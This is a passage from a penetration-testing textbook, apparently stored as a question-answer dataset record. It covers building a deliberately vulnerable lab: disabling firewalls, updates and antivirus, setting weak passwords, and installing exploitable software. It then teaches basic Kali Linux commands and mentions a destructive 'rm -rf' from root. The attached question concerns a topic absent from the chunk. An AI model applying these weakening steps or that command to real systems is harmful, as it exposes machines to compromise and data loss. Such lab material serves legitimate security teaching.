installa-\ntion media include TechNet and MSDN (the Microsoft Developer Network),\namong others. (You should be able to use your Windows virtual machines\non a trial basis for 30 days without a license key.)\nCreating the windows xP target\nYour Windows XP target should be a base installation of Windows XP SP3\nwith no additional security updates. (Visit my website at http://www\n.bulbsecurity.com/ for more information about finding a copy of Windows XP.)\nOnce you have a copy of Windows XP SP3, here’s how to install it on\nMicrosoft Windows or Mac OS. VMware Player on Microsoft Windows\nTo install Windows XP on VMware Player for Windows:\n1. Choose Create A New Virtual Machine in VMware Player and point\nthe New Virtual Machine Wizard to the Windows XP installation disk\nor ISO image. Depending on your source disk or image, you may be\noffered the option to use Easy Install (if you’re installing a version with\na license key), or you may see a yellow triangle warning, “Could not\ndetect which operating system is in this disc image. You will need to\nspecify which operating system will be installed.” In the latter case, just\npress Next. 2. In the Select a Guest Operating System dialog, select Microsoft Windows\nin the Guest operating system section and your version of Windows XP in\nthe drop-down box, as shown in Figure 1-20, and press Next. Figure 1-20: Selecting your version of Windows XP\nSetting Up Your Virtual Lab 29\n3. In the next dialog, enter Bookxp XP SP3 as the name of your virtual\nmachine and press Next. 4. In the Specify Disk Capacity dialog, accept the recommended hard disk\nsize for your virtual machine of 40GB and check the box for Store vir-\ntual disk as a single file, as shown in Figure 1-21, and press Next. Figure 1-21: Specifying the disk capacity\nnote The Virtual Machine will not take up the entire 40GB; it will only take up space on\nyour hard drive as needed. This is just a maximum value. 5. In the Ready to Create Virtual Machine dialog, shown in Figure 1-22,\nclick Customize Hardware. Figure 1-22: Customizing your hardware\n30 Chapter 1\n6. In the Hardware dialog, choose Network Adapter, and in the Network\nConnection field that appears, select Bridged: Connected directly to\nthe physical network. Next, click Configure Adapters and select the\nadapter you’re using to connect to the Internet, as shown in Figure 1-23. Then press OK, Close, and Finish. Figure 1-23: Configuring your network adapter as bridged\nYou should now be able to play your Windows XP virtual machine. Continue to the instructions for installing and activating Windows XP\nin “Installing and Activating Windows” on page 32. VMware Fusion on Mac OS\nIn VMware Fusion, go to File4New4Import from disk or image\nand point it to the Windows XP installation disk or image, as shown\nin Figure 1-24. Follow the prompts to create a fresh installation of Windows XP SP3. Setting Up Your Virtual Lab 31\nFigure 1-24: Creating a new virtual machine\nInstalling and Activating Windows\nAs part of the installation process, you will be prompted for a Windows\nlicense key. If you have one, enter it here. If not, you should be able to use\nthe virtual machine on a trial basis for 30 days. To continue without enter-\ning a license key, click Next when prompted for the key. A pop-up will warn\nyou that entering a license key is recommended and ask if you would like to\nenter one now, as shown in Figure 1-25. Just click No. Figure 1-25: License key dialog\n32 Chapter 1\nAs shown in Figure 1-26, when prompted, set Computer name to Bookxp. Set Administrator password to password. Figure 1-26: Setting the computer name and Administrator password\nYou can leave the date/time and TCP/IP settings at their defaults when\nprompted. Likewise, leave the Windows XP target as part of the workgroup\nWORKGROUP instead of joining it to a domain, as shown in Figure 1-27. Figure 1-27: Workgroup settings\nSetting Up Your Virtual Lab 33\nTell Windows not to automatically install security updates, as shown in\nFigure 1-28. This step is important, because some of the exploits we will run\nrely on missing Windows patches. Figure 1-28: Turning off automatic security updates\nYou will then be prompted to activate Windows. If you entered a license\nkey, go ahead and activate it. Otherwise you can choose No, remind me\nevery few days, as shown in Figure 1-29. Figure 1-29: Activating Windows\n34 Chapter 1\nNow create user accounts georgia and secret, as shown in Figure 1-30. We\nwill create passwords for these users after setup is finished. Figure 1-30: Adding users\nWhen Windows starts up, log in as the user georgia with no\npassword. Installing VMware Tools\nNow install VMware Tools, which will make it easier to use your virtual\nmachine by, for example, letting you copy/paste and drag programs onto\nthe virtual machine from the host system. VMware Player on Microsoft Windows\nIn VMware Player, install VMware Tools from Player4Manage4Install\nVMware Tools, as shown in Figure 1-31. The VMware Tools installer should\nautomatically run in Windows XP. Setting Up Your Virtual Lab 35\nFigure 1-31: Installing VMware Tools in VMware Player\nVMware Fusion on Mac OS\nInstall VMware Tools from Virtual Machines4Install VMware Tools, as\nshown in Figure 1-32. The VMware Tools installer should automatically run\nin Windows XP. Figure 1-32: Installing VMware Tools in VMware Fusion\n36 Chapter 1\nTurning Off Windows Firewall\nNow open the Control Panel from the Windows Start menu. Click Security\nCenter4Windows Firewall to turn off the Windows Firewall, as shown in\nFigure 1-33. Figure 1-33: Turning off the Windows firewall\nSetting User Passwords\nAgain in the Control Panel, go to User Accounts. Click the user georgia\nand then select Create a password. Set georgia’s password to password, as\nshown in Figure 1-34. Do the same thing for the user secret, but set secret’s\npassword to Password123. Figure 1-34: Setting a user password\nSetting Up Your Virtual Lab 37\nSetting a Static IP Address\nNext, set a static IP address so your networking information won’t change\nas you work through the book. But first we need to figure out the address\nof our default gateway. Ensure that your Windows XP system is set to use bridged networking\nin VMware. By default, your virtual machine will automatically pull an IP\naddress using DHCP. To find the default gateway, open a Windows command prompt by\ngoing to Start4Run, entering cmd, and clicking OK. In the command\nprompt, enter ipconfig. This will show you the networking information,\nincluding the default gateway. C:\\Documents and Settings\\georgia>ipconfig\nWindows IP Configuration\nEthernet adapter Local Area Connection:\nConnection-specific DNS Suffix . : XXXXXXXX\nIP Address. . . . . . . . . . . . : 192.168.20.10\nSubnet Mask . . . . . . . . . . . : 255.255.255.0\nDefault Gateway . . . . . . . . . : 192.168.20.1\nC:\\Documents and Settings\\georgia>\nIn my case, the IP address is 192.168.20.10, the subnet mask is\n\n255.255.255.0, and the default gateway is 192.168.20.1. 1. In the Control Panel, go to Network and Internet Connections and\nclick Network Connections at the bottom of the screen. 2. Right-click Local Area Connection and then select Properties. 3. Highlight Internet Protocol (TCP/IP) and select Properties. Now\nenter a static IP address and set the Subnet mask and Default gateway\nto match the data you found with the ipconfig command, as shown in\nFigure 1-35. Set the Preferred DNS server to your default gateway as well. Now it’s time to see if our virtual machines can communicate. Once\nyou’re sure that the settings match, return to the Kali virtual machine (start\nit if you had shut it down) and enter ping <static ip address of your Windows\nXP virtual machine>, as shown here. note My IP address is 192.168.20.10. Throughout the book, you should replace this\nvalue with the IP address of your systems. root@kali:~# ping 192.168.20.10\nPING 192.168.20.10 (192.168.20.10) 56(84) bytes of data. 64 bytes from 192.168.20.10: icmp_req=1 ttl=128 time=3.06 ms\n^C\n38 Chapter 1\nFigure 1-35: Setting a static IP address\nEnter ctrl-C to stop the ping command. If you see output beginning\nwith 64 bytes from <ip address of XP>, as shown previously, your virtual\nmachines are able to communicate. Congratulations! You’ve set up a net-\nwork of virtual machines. If instead you see a message including the text Destination Host\nUnreachable, troubleshoot your networking: Make sure your virtual\nmachines are on the same bridged virtual network, check that your\ndefault gateway is correct, and so on. Making XP Act Like It’s a Member of a Windows Domain\nFinally, we need to modify a setting in Windows XP so that it will behave as\nif it were a member of a Windows domain, as many of your clients will be. I’m not having you set up an entire Windows domain here, but during post\nexploitation, a couple of exercises will simulate a domain environment. Return to your XP virtual machine and follow these steps. 1. Select Start4Run and enter secpol.msc to open the Local Security\nSettings panel. 2. Expand Local Policies on the left and double-click Security Options\non the right. 3. In the Policy list in the pane on the right, double-click Network access:\nSharing and security model for local accounts and choose Classic\n- local users authenticate as themselves from the drop-down list, as\nshown in Figure 1-36. Setting Up Your Virtual Lab 39\nFigure 1-36: Changing a local security setting to make your target act like a member of a\nWindows domain\n4. Click Apply and then OK. 5. Close any open windows in your virtual machine. Installing Vulnerable Software\nIn this section we’ll install some vulnerable software on our Windows XP\nvirtual machine. We’ll be attacking this software in later chapters. Open\nyour Windows XP virtual machine and, while still logged in as user georgia,\nfollow the directions to install each of the packages listed here. Zervit 0.4\nDownload Zervit version 0.4 from http://www.exploit-db.com/exploits/12582/. (Click the Vulnerable App option to download the files.) Unzip the down-\nloaded archive and double-click the Zervit program to open and run it. Then enter port number 3232 in the console when the software starts. Answer Y to allowing directory listing, as shown in Figure 1-37. Zervit will\nnot automatically restart when you reboot Windows XP, so you will need to\nrestart it if you reboot. 40 Chapter 1\nFigure 1-37: Starting Zervit 0.4\nSLMail 5.5\nDownload and run SLMail version 5.5 from http://www.exploit-db.com/\nexploits/638/, using the default options when prompted. Just click Next for\nall of the options and don’t change anything. If you get a warning about a\ndomain name, just ignore it and click OK. We don’t really need to deliver\nany email here. Once SLMail is installed, restart your virtual machine. Then open\nStart4All Programs4SL Products4SLMail4SLMail Configuration. In the Users tab (default), right-click the SLMail Configuration window\nand choose New4User, as shown in Figure 1-38. Figure 1-38: Adding a user in SLMail\nSetting Up Your Virtual Lab 41\nClick the newly created user icon, enter username georgia, and fill in\nthe information for the user, as shown in Figure 1-39. The mailbox name\nshould be georgia with password password. Keep the defaults and press OK\nonce you’ve finished. Figure 1-39: Setting the user information in SLMail\n3Com TFTP 2.0.1\nNext, download 3Com TFTP version 2.0.1 as a zipped file from http://www\n.exploit-db.com/exploits/3388/. Extract the files and copy 3CTftpSvcCtrl and\n3CTftpSvc to the directory C:\\Windows, as shown in Figure 1-40. Figure 1-40: Copying 3Com TFTP to C:\\Windows\n42 Chapter 1\nThen open 3CTftpSvcCtrl (the blue 3 icon) and click Install Service, as\nshown in Figure 1-41. Figure 1-41: Installing 3Com TFTP\nClick Start Service to start 3Com TFTP for the first time. From now on, it\nwill automatically start when you boot up the computer. Press Quit to exit. XaMPP 1.7.2\nNow we’ll install an older version of the XAMPP software, version 1.7.2, from\nhttp://www.oldapps.com/xampp.php?old_xampp=45/. (The older version of\nInternet Explorer on Windows XP seems to have some trouble opening this\npage. If you have trouble, download the software from your host system and\ncopy it onto Windows XP’s desktop.)\n1. Run the installer and accept the default options as they’re presented to\nyou. When installation is finished, choose option 1. start XAMPP Control\nPanel, as shown in Figure 1-42. Figure 1-42: Starting XAMPP Control Panel\nSetting Up Your Virtual Lab 43\n2. In the XAMPP Control Panel, install the Apache, MySQL, and FileZilla\nservices (select the Svc checkbox to the left of the service name). Then\nclick the Start button for each service. Your screen should look like the\none shown in Figure 1-43. Figure 1-43: Installing and starting XAMPP services\n3. Click the Admin button for FileZilla in the XAMPP Control Panel. The\nAdmin panel is shown in Figure 1-44. Figure 1-44: FileZilla Admin panel\n4. Go to Edit4Users to open the Users dialog, shown in Figure 1-45. 5. Click the Add button on the right of the dialog box. 6. In the Add User Account dialog box, enter georgia and press OK. 44 Chapter 1\nFigure 1-45: Adding an FTP user\n7. With georgia highlighted, check the Password box under Account\nSettings and enter password. Click OK. When prompted to share a folder, browse to the georgia’s\nDocuments folder on Windows and select it to share it, as shown in Figure 1-46. Leave the defaults for all other checkboxes, as shown in the figure. Click\nOK once you’ve finished and exit the various open windows. Figure 1-46: Sharing a folder via FTP\nSetting Up Your Virtual Lab 45\nadobe acrobat Reader\nNow we’ll install Adobe Acrobat Reader version 8.1.2 from http://www.oldapps\n.com/adobe_reader.php?old_adobe=17/. Follow the default prompts to install it. Click Finish once you’re done. (Here again you may need to download the\nfile to your host system and copy it to Windows XP’s desktop.)\nWar-FTP\nNext, download and install War-FTP version 1.65 from http://www.exploit-db\n.com/exploits/3570/. Download the executable from exploit-db.com to georgia’s\ndesktop and run the downloaded executable to install. You do not need to\nstart the FTP service; we will turn it on when we discuss exploit develop-\nment in Chapters 16 through 19. WinSCP\nDownload and install the latest version of WinSCP from http://winscp.net/. Choose the Typical Installation option. You can uncheck the additional\nadd-ons. Click Finish once you’re done. Installing Immunity Debugger and Mona\nNow we’ll finish up the Windows XP virtual machine by installing a debug-\nger, a tool that helps detect errors in computer programs. We’ll be using\nthe debugger in the exploit development chapters. Visit the Immunity\nDebugger registration page at http://debugger.immunityinc.com/ID_register.py. Complete the registration and then press the Download button. Run the\ninstaller. When asked if you want to install Python, click Yes. Accept the license\nagreement and follow the default installation prompts. When you close the\ninstaller, the Python installation will automatically run. Use the default\ninstallation values. Once Immunity Debugger and Python have been installed, download\nmona.py from http://redmine.corelan.be/projects/mona/repository/raw/mona.py/. Copy mona.py to C:\\Program Files\\Immunity Inc\\Immunity Debugger\\PyCommands,\nas shown in Figure 1-47. Open Immunity Debugger, and at the command prompt at the bottom\nof the window, enter !mona config -set workingfolder c:\\logs\\%p, as shown in\nFigure 1-48. This command tells mona to log its output to C:\\logs\\<program\nname>, where <program name> is the program Immunity Debugger is cur-\nrently debugging. Now our Windows XP target is set up and ready to go. 46 Chapter 1\nFigure 1-47: Installing Mona\nFigure 1-48: Setting up Mona’s logs\nSetting Up Your Virtual Lab 47\nsetting up the ubuntu 8.10 target\nBecause Linux is open source, you can simply download the Linux vir-\ntual machine as part of the torrent for this book. Unzip the 7-Zip archive\nBookUbuntu.7zip and use the password 1stPentestBook?! to open the archive. Open the .vmx file in VMware. If you are prompted with a message that\nsays the virtual machine appears to be in use, click Take Ownership and,\nas with Kali, select I copied it. The username and password for the virtual\nmachine itself are georgia:password. Once you have the Ubuntu virtual machine loaded, make sure the net-\nwork interface is set to Bridged in VMware and click the networking icon\n(two computers) at the top right of the screen to attach the virtual machine\nto the network. Do not install any updates if prompted. As with Windows XP,\nwe will exploit out-of-date software on this system. Now this virtual machine\nis all set up. (I’ll show you how to set a static IP address in Linux in Chapter 2.)\nCreating the windows 7 target\nAs with Windows XP, you’ll need to install a copy of Windows 7 SP1 in\nVMware by loading your image or DVD. A 30-day trial version of 32-bit\nWindows 7 Professional SP1 will work fine, but you’ll need to activate it after\n30 days if you wish to continue using it. To find a legal version of Windows 7\nSP1, try one of the following:\n• Visit http://www.softpedia.com/get/System/OS-Enhancements/Windows-7.shtml. • Visit http://technet.microsoft.com/en-us/evalcenter/dn407368. note Your school or workplace may have access to programs like DreamSpark or BizSpark\nthat give you access to Windows operating systems. You can also check my website\n(http://www.bulbsecurity.com/) for more resources. Creating a User Account\nAfter installing Windows 7 Professional SP1, opt out of security updates and\ncreate user Georgia Weidman as an administrator with a password of pass-\nword, as shown in Figures 1-49 and 1-50. Again opt out of automatic updates. When prompted, set the comput-\ner’s current location to a work network. Once the installation has finished,\nlog in to the account Georgia Weidman. Leave the Windows Firewall enabled. VMware will reboot Windows 7 a few times as it installs everything. Now tell VMware to install VMware Tools, as you did in the Windows XP\nsection. After instructing VMware to install VMware Tools in the virtual\nmachine, if the installer does not automatically run, go to My Computer\nand run the VMware Tools installer from the virtual machine’s DVD drive,\nas shown in Figure 1-51.",
    "question": "What is the purpose of the Smartphone Pentest Framework mentioned in the text?",
    "summary": "The book provides a hands-on introduction to penetration testing, emphasizing the importance of understanding the confidentiality, integrity, and availability of a company's systems. It guides readers through setting up a virtual lab using VMware, installing Kali Linux, and configuring vulnerable systems for testing. The book also covers essential tools and techniques for pentesting, including Metasploit, Nessus, and the Smartphone Pentest Framework, and explains how to perform various types of attacks and assessments."
  },
  {
    "start": 17,
    "end": 19,
    "text": "48 Chapter 1\nFigure 1-49: Setting a username\nFigure 1-50: Setting a password for the user Georgia Weidman\nSetting Up Your Virtual Lab 49\nFigure 1-51: Installing VMware Tools\nOpting Out of Automatic Updates\nThough our attacks on Windows 7 will largely rely on flaws in third-party\nsoftware rather than missing Windows patches, let’s once again opt out of\nWindows updates for this virtual machine. To do this, go to Start4Control\nPanel4System and Security. Then under Windows Update, click Turn\nAutomatic Updating On or Off. Set Important updates to Never check for\nupdates (not recommended) as shown in Figure 1-52. Click OK. Figure 1-52: Opting out of automatic updates\n50 Chapter 1\nSetting a Static IP Address\nSet a static IP address by choosing Start4Control Panel4Network and\nInternet4Network and Sharing Center4Change Adapter Settings4Local\nArea Network. Now right-click and choose Properties4Internet Protocol\nVersion 4 (TCP/IPv4)4Properties. Set these values as you did for Windows\nXP (discussed in “Setting a Static IP Address” on page 38), but use a dif-\nferent value for the Windows 7 IP address, as shown in Figure 1-53. If asked\nwhether to configure this network as Home, Work, or Public, choose Work. (Be sure that your virtual machine network setting is configured to use a\nbridged adapter.)\nFigure 1-53: Setting a static IP address\nBecause the Windows firewall is turned on, Windows 7 won’t respond\nto a ping from our Kali system. Therefore, we’ll ping our Kali system\nfrom Windows 7. Start your Kali Linux virtual machine, and from your\nWindows 7 virtual machine, click the Start button. Then enter cmd in the\nRun dialog to open a Windows command prompt. At the prompt, enter\nthe following. ping <IP Address of Kali>\nIf everything is working, you should see replies to the ping request as in\n“Setting a Static IP Address” on page 38. Setting Up Your Virtual Lab 51\nAdding a Second Network Interface\nNow shut down your Windows 7 virtual machine. We’re going to add a\nsecond network interface to the Windows 7 virtual machine that will allow\nthe Windows 7 system to be part of two networks. We’ll use this setup dur-\ning post exploitation to simulate attacking additional systems on a second\nnetwork. In VMware Player on Microsoft Windows, choose Player4Manage4\nVirtual Machine Settings4Add, select Network Adapter, and press Next. This adapter will be Network Adapter 2. In VMware Fusion on Mac OS,\ngo to Virtual Machine Settings, select Add a Device, and select a network\nadapter. Set this new adapter to the Host Only network. Press OK, and the\nvirtual machine should restart. (We do not need to set a static IP address\nfor Network Adapter 2.) When the virtual machine restarts, open Virtual\nMachine Settings again, and you should see the two network adapters\nlisted. Both should be connected when your computer powers on. Installing Additional Software\nNow install the following software in your Windows 7 virtual machine,\nusing default settings across the board:\n• Java 7 Update 6, an out-of-date version of Java, from http://www.oldapps\n.com/java.php?old_java=8120/. • Winamp version 5.55 from http://www.oldapps.com/winamp.php?old_\nwinamp=247/. (Uncheck the changes to your search engine and\nso on.)\n• The latest version of Mozilla Firefox from http://www.mozilla.org/. • Microsoft Security Essentials from http://windows.microsoft.com/en-us/\nwindows/security-essentials-download/. (Download the latest antivirus sig-\nnatures, making sure to download the correct version for your 32-bit\nWindows install. Don’t turn on automatic sample submission or scan on\ninstall. Also, disable real-time protection for now. We will enable this\nfeature when we study bypassing antivirus software in Chapter 12. This\nsetting can be found on the Settings tab under Real-time Protection. Uncheck Turn on real-time protection (recommended), as shown in\nFigure 1-54. Click Save changes.)\n52 Chapter 1\nFigure 1-54: Turning off real-time protection\nFinally, install the BookApp custom web application found in the torrent\nfor this book. (1stPentestBook?! is the password for the archive.) Drag and\ndrop the BookApp folder on the Windows 7 virtual machine. Then follow\nthe instructions in InstallApp.pdf detailing how to install BookApp. Here is\na high-level overview of the instructions. 1. Run Step1-install-iis.bat as an administrator by right-clicking the .bat file\nand choosing Run as administrator. (Once install finishes, you can close\nany DOS windows that are still up.)\n2. Navigate to the SQL folder and run SQLEXPRWT_x86_ENU.EXE. Detailed\ninstructions with screenshots are included in the InstallApp PDF. 3. Install Service Pack 3 by running SQLServer2008SP3-KB2546951-x86-ENU\n.exe. When warned that program has known compatibility issues, click\nOK to run it and complete the install. Choose to accept any changes. 4. Using SQL Server Configuration Manager, enable Named Pipes. Setting Up Your Virtual Lab 53\n5. Navigate back to the main app folder and run Step2-Modify-FW.bat as an\nadministrator. 6. Install XML support for MS SQL with sqlxml_x86-v4.exe from the SQL\nfolder. 7. Run Step3-Install-App.bat as an administrator from the main app folder. 8. Use MS SQL Management Studio to run db.sql from the SQL folder, as\ndescribed in detail in the InstallApp PDF. 9. Finally, change the user permissions on the AuthInfo.xml file in the book\napp folder to give full permissions to IIS_USERS. summary\nWe set up our virtual environment, downloaded and customized Kali Linux\nfor attacks, configured our virtual network, and configured our target oper-\nating systems—Windows XP, Windows 7, and Ubuntu. In the next chapter, we will get used to working with the Linux command\nline, and we’ll be on our way to learning how to use the many pentesting\ntools and techniques in this book. 54 Chapter 1\n2\nusing k ali linux\nYou will use Kali Linux as the attack platform through-\nout this book. Kali, the successor to the popular\nBackTrack Linux, is a Debian-based distribution that\ncomes with a plethora of penetration testing tools\npreinstalled and preconfigured. Anyone who’s ever\ntried to set up a pentesting box from scratch the day\nbefore a big engagement knows that getting everything working correctly\ncan be a real pain. Having everything preconfigured in Kali can save a lot\nof time and headaches. Kali Linux works just like the standard Debian\nGNU/Linux distribution, with a lot of extra tools. Rather than point and click your way through Kali, you’ll use the Linux\ncommand line because that’s where the real power lies. In this chapter we’ll\nlook at how to perform some common Linux tasks from the command line. If you’re already a Linux expert, you can skip this chapter and move on to\nChapter 3; if not, take some time and dive in. Linux Command Line\nThe Linux command line looks like this:\nroot@kali:~#\nLike a DOS prompt or the Mac OS terminal, the Linux command\nline gives you access to a command processor called Bash that allows you\nto control the system by entering text-based instructions. When you open\nthe command line you’ll see the prompt root@kali#. Root is the superuser\non Linux systems, and it has complete control of Kali. To perform operations in Linux, you enter commands along with any\nrelevant options. For example, to view the contents of root’s home directory,\nenter the command ls as shown here. root@kali:~# ls\nDesktop\nAs you can see, there’s not much in the root directory, only a folder\ncalled Desktop. the Linux Filesystem\nIn the Linux world, everything is a file: keyboards, printers, network\ndevices—everything. All files can be viewed, edited, deleted, created,\nand moved. The Linux filesystem is made up of a series of directories\nthat branch off from the root of the filesystem (/). To see your current directory, enter pwd at the terminal:\nroot@kali:~# pwd\n/root\nChanging Directories\nTo move to another directory, enter cd directory using either the absolute or\nrelative path to the new directory, based your current location. The absolute\npath is the path to a file in relation to the root directory (/). For example, to\nchange to your desktop from anywhere, you could enter the absolute path\nto the desktop with cd /root/Desktop to reach the root user’s desktop. If you\nwere in the directory /root (the root user’s home directory), you could use\nthe relative path to the desktop (that is, relative to your current location) by\nentering cd Desktop, which would also take you to the desktop. The command cd .. takes you back one level in the filesystem, as\nshown here. root@kali:~/Desktop# cd .. root@kali:~/# cd ../etc\nroot@kali:/etc#\n56 Chapter 2\nEntering cd .. from root’s Desktop directory takes us back to root’s home\ndirectory. Entering cd ../etc from there moves us back up to the root of the\nfilesystem and then to the /etc directory. Learning about Commands: the man Pages\nTo learn more about a command and its options and arguments, you can\nview its documentation (called its manual page, or man page) by entering man\ncommand. For example, to learn more about the ls command enter man ls as\nshown in Listing 2-1. root@kali:~# man ls\nLS(1) User Commands LS(1)\n\nNAME\nls - list directory contents\n\nSYNOPSIS\nls [OPTION]... [FILE]... u\nDESCRIPTION v\nList information about the FILEs (the current directory by default). Sort entries alphabetically if none of -cftuvSUX nor --sort is speci-\nfied. Mandatory arguments to long options are mandatory for short options\ntoo. -a, --all w\ndo not ignore entries starting with . -A, --almost-all\ndo not list implied . and .. --snip--\n-l use a long listing format\n--snip--\nListing 2-1: Linux man page\nThe man page gives useful (if a bit unfriendly looking) information\nabout the ls command including its usage u, description v, and available\noptions w. As you can see in the description section at v, the ls command lists all\nfiles in the current working directory by default, but you can also use ls to\nget information about a particular file. For example, according to the man\npage you can use the -a option with ls to show all files, including hidden\ndirectories—directories not shown in the default ls listing—as shown in\nListing 2-2. Using Kali Linux 57\nroot@kali:~# ls -a\n. .mozilla\n.. .msf4\n.android .mysql_history\n.bash_history .nano_history\n--snip--\nListing 2-2: Using an option with ls\nAs you can see, there are several hidden directories in the root direc-\ntory, all of which are preceded by a period (.) character. (In Chapter 8,\nwe’ll see how these sometimes-hidden directories can lead to a system com-\npromise.) You can also see the entries . and .., which denote the current\ndirectory and the parent directory, respectively. user Privileges\nLinux user accounts offer resources to a particular individual or service. A user may log in with a password and be offered certain resources on the\nLinux system, such as the ability to write files and browse the Internet. That user may not be able to see files that belong to other users and can\nhave reasonable assurance that other users can’t see his or her files either. In addition to traditional user accounts used by a person who logs in with a\npassword and accesses the system, Linux systems can allow software to have\na user account. The software can have the ability to use system resources\nto do its job, but it cannot read other users’ private files. The accepted best\npractice on Linux systems is to run day-to-day commands as an unprivileged\nuser account instead of running everything as the privileged root user to\navoid inadvertently harming your system or granting excessive privilege to\nthe commands and applications you run. Adding a User\nBy default, Kali offers only the privileged root account. Though many\nsecurity tools require root privileges to run, you may want to add another\nunprivileged account for everyday use to reduce the potential for damage\nto your system. Remember, the root account can do anything on Linux,\nincluding corrupting all of your files. To add a new user georgia to your Kali system use the adduser command,\nas shown in Listing 2-3. root@kali:~# adduser georgia\nAdding user `georgia' ... Adding new group `georgia' (1000) ... Adding new user `georgia' (1000) with group `georgia' ... u\nCreating home directory `/home/georgia' ... v\nCopying files from `/etc/skel' ... Enter new UNIX password: w\nRetype new UNIX password:\n58 Chapter 2\npasswd: password updated successfully\nChanging the user information for georgia\nEnter the new value, or press ENTER for the default\nFull Name []: Georgia Weidman x\nRoom Number []:\nWork Phone []:\nHome Phone []:\nOther []:\nIs the information correct? [Y/n] Y\nListing 2-3: Adding a new user\nAs you can see, in addition to adding a user to the system, a group georgia\nis created, a new user is added to this group u, a home directory is created\nfor the user v, and the system prompts for information about the user, such\nas a password w and the user’s full name x. Adding a User to the sudoers File\nWhen you need to do something that requires root privileges as a regular\nuser, use the sudo command along with the command that you want to run\nas root, and then enter your password. For the newly created user georgia\nto be able to run privileged commands you need to add her to the sudoers\nfile, which specifies which users can use the sudo command. To do so, enter\nadduser username sudo as shown here. root@kali:~# adduser georgia sudo\nAdding user 'georgia' to group `sudo' ... Adding user georgia to group sudo\nDone. Switching Users and Using sudo\nTo switch users in your terminal session, say from the root user to georgia,\nuse the su command as shown in Listing 2-4. root@kali:~# su georgia\ngeorgia@kali:/root$ adduser john\nbash: adduser: command not found u\ngeorgia@kali:/root$ sudo adduser john\n[sudo] password for georgia:\nAdding user `john' ... v\nAdding new group `john' (1002) ... Adding new user `john' (1002) with group `john' ... --snip--\ngeorgia@kali:/root$ su\nPassword:\nroot@kali:~#\nListing 2-4: Switching to a different user\nUsing Kali Linux 59\nYou switch users with the su command. If you try to run commands\n(such as the adduser command) that require more privileges than the cur-\nrent user (georgia), the command is unsuccessful (command not found) u\nbecause you can run the adduser command only as root. Luckily, as discussed previously, you can use the sudo command to run\na command as root. Because the georgia user is a member of the sudo group,\nyou can run privileged commands, and you can see user john is added v to\nthe system. To change back to the root user, enter the su command with no user-\nname. You will be prompted for the root’s password (toor). Creating a New File or Directory\nTo create a new, empty file called myfile, use the touch command. root@kali:# touch myfile\nTo create a new directory in your current working directory, enter mkdir\ndirectory as shown here. root@kali:~# mkdir mydirectory\nroot@kali:~# ls\nDesktop mydirectory myfile\nroot@kali:~# cd mydirectory/\nUse ls to confirm that the new directory has been created, and then\nchange to mydirectory using cd. Copying, Moving, and Removing Files\nTo copy a file, use the cp command as shown here. root@kali:/mydirectory# cp /root/myfile myfile2\nThe syntax is cp source destination. When using cp, the original file is\nleft in place, and a copy is made at the desired destination. Similarly, you can move a file from one location to another using the\nmv command. The syntax is identical to cp, but this time the file is removed\nfrom the source location. You can remove a file from the filesystem by entering rm file. To\nremove files recursively use the -r command. warning Be careful when removing files, particularly recursively! Some hackers joke that the\nfirst command to teach Linux beginners is rm -rf from the root directory, which forci-\nbly deletes the entire filesystem. This teaches new users the power of performing actions\nas root. Don’t try that at home! 60 Chapter 2\nAdding Text to a File\nThe echo command echoes what you enter to the terminal, as shown here. root@kali:/mydirectory# echo hello georgia\nhello georgia\nTo save text to a file, you can redirect your input to a file instead of to\nthe terminal with the > symbol. root@kali:/mydirectory# echo hello georgia > myfile\nTo see the contents of your new file you can use the cat command. root@kali:/mydirectory# cat myfile\nhello georgia\nNow echo a different line of text into myfile as shown next. root@kali:# echo hello georgia again > myfile\nroot@kali:/mydirectory# cat myfile\nhello georgia again\nThe > overwrites the previous contents of the file. If you echo another\nline into myfile, that new line overwrites the output of the previous com-\nmand. As you can see, the contents of myfile now reads hello georgia again. Appending Text to a File\nTo append text to a file, use >> as shown here. root@kali:/mydirectory# echo hello georgia a third time >> myfile\nroot@kali:/mydirectory# cat myfile\nhello georgia again\nhello georgia a third time\nAs you can see, appending preserves the previous contents of the file. File Permissions\nIf you look at the long output of ls -l on myfile, you can see the current per-\nmissions for myfile. root@kali:~/mydirectory# ls -l myfile\n-rw-r--r-- 1 root root 47 Apr 23 21:15 myfile\nFrom left to right you see the file type and permissions (-rw-r—r--), the\nnumber of links to the file (1), the user and group that own the file (root),\nthe file size (47 bytes), the last time the file was edited (April 23, 21:15), and\nfinally the filename (myfile). Using Kali Linux 61\nLinux files have permissions to read (r), write (w), and execute (x) and\nthree sets of user permissions: permissions for the owner, the group, and\nall users. The first three letters denote the permissions for the owner, the\nfollowing three denote the permissions for the group, and the final three\ndenote the permissions for all users. Since you created myfile from the root\nuser account, the file is owned by user root and group root, as you can see in\nthe output with root root. User root has read and write permissions for the\nfile (rw). Other users in the group, if there are any, can read the file (r) but\nnot write to or execute it. The last r shows that all users on the filesystem\ncan read the file. To change permissions on a file, use the chmod command. You can use\nchmod to specify permissions for the owner, the group, and the world. When\nspecifying permissions use the numbers from 0 through 7 as shown in\nTable 2-1. table 2-1: Linux File Permissions\nInteger Value Permissions Binary representation\n7 full 111\n6 read and write 110\n5 read and execute 101\n4 read only 100\n3 write and execute 011\n2 write only 010\n1 execute only 001\n0 none 000\nWhen entering new file permissions, you use one digit for the owner,\none for the group, and one for world. For example, to give the owner full\npermissions but the group and the world no permissions to read, write, or\nexecute a file, use chmod 700 like this:\nroot@kali:~/mydirectory# chmod 700 myfile\nroot@kali:~/mydirectory# ls -l myfile\n-rwx------u 1 root root 47 Apr 23 21:15 myfile\nNow when you run the ls -l command on myfile, you can see that root\nhas read, write, and execute (rwx) permissions and the other sets are blank u. If you try to access the file as any user other than root, you’ll get a permis-\nsion denied error. editing Files\nPerhaps no debate brings out such passion among Linux users as which is\nthe best file editor. We’ll look at the basics of using two popular editors, vi\nand nano, beginning with my favorite, nano. 62 Chapter 2\nroot@kali:~/mydirectory# nano testfile.txt\nOnce in nano you can begin adding text to a new file called testfile.txt. When you open nano, you should see a blank file with help information for\nnano shown at the bottom of the screen, as shown here. [ New File ]\n^G Get Help ^O WriteOut ^R Read File ^Y Prev Page ^K Cut Text ^C Cur Pos\n^X Exit ^J Justify ^W Where Is ^V Next Page ^U UnCut Text^T To Spell\nTo add text to the file, just start typing. Searching for Text\nTo search for text in a file, use ctrl-W, and then enter the text to search for\nat the search prompt as shown next. --snip--\nSearch:georgia\n^G Get Help ^Y First Line^T Go To Line^W Beg of ParM-J FullJstifM-B Backwards\n^C Cancel ^V Last Line ^R Replace ^O End of ParM-C Case SensM-R Regexp\nNano should find the text georgia if the word is in the file. To exit,\npress ctrl-X. You will be prompted to save the file or lose the 